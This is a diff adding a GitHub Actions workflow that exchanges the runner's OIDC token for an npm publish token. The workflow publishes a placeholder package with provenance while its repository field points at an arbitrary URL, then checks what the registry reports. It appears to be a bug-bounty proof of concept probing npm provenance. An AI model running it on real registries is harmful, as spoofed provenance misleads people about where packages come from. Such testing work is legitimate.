@@ -1,0 +1,61 @@
+name: prov
+on:
+  workflow_dispatch:
+    inputs:
+      pkg:
+        required: true
+        type: string
+      version:
+        required: true
+        type: string
+      repofield:
+        required: true
+        type: string
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  prov:
+    runs-on: ubuntu-latest
+    steps:
+      - name: publish with provenance, package.json repository field pointing elsewhere
+        env:
+          PKG: ${{ inputs.pkg }}
+          VER: ${{ inputs.version }}
+          RF: ${{ inputs.repofield }}
+        run: |
+          set -uo pipefail
+          esc () { python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$1"; }
+          IDT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+                "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=npm:registry.npmjs.org" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "::add-mask::$IDT"
+          curl -sS -o /tmp/t.json -w 'exchange=%{http_code}\n' -X POST -H "Authorization: Bearer $IDT" \
+            "https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/$(esc "$PKG")"
+          T=$(python3 -c 'import json;print(json.load(open("/tmp/t.json")).get("token",""))')
+          [ -z "$T" ] && { cat /tmp/t.json; exit 0; }
+          echo "::add-mask::$T"
+          echo "//registry.npmjs.org/:_authToken=$T" > /tmp/npmrc
+          rm -rf /tmp/p && mkdir -p /tmp/p
+          python3 - "$PKG" "$VER" "$RF" > /tmp/p/package.json <<'PY'
+          import sys, json
+          print(json.dumps({"name": sys.argv[1], "version": sys.argv[2],
+                            "description": "authorized security research placeholder (HackerOne GitHub program)",
+                            "main": "index.js", "license": "MIT",
+                            "repository": {"type": "git", "url": "git+" + sys.argv[3] + ".git"}}))
+          PY
+          echo "module.exports='security research placeholder';" > /tmp/p/index.js
+          cat /tmp/p/package.json
+          echo "=== publish WITH provenance ==="
+          (cd /tmp/p && npm publish --access public --provenance --userconfig /tmp/npmrc --loglevel http 2>&1 | tail -14) || true
+          echo "=== what the registry now reports ==="
+          curl -sS "https://registry.npmjs.org/$(esc "$PKG")" | python3 -c '
+          import sys,json
+          d=json.load(sys.stdin); v=d.get("versions",{})
+          import os
+          ver=os.environ["VER"]
+          x=v.get(ver,{})
+          print("version present:", ver in v)
+          print("repository field:", json.dumps(x.get("repository")))
+          print("dist keys:", sorted((x.get("dist") or {}).keys()))
+          print("attestations:", json.dumps((x.get("dist") or {}).get("attestations")))'
+          echo "===DONE==="
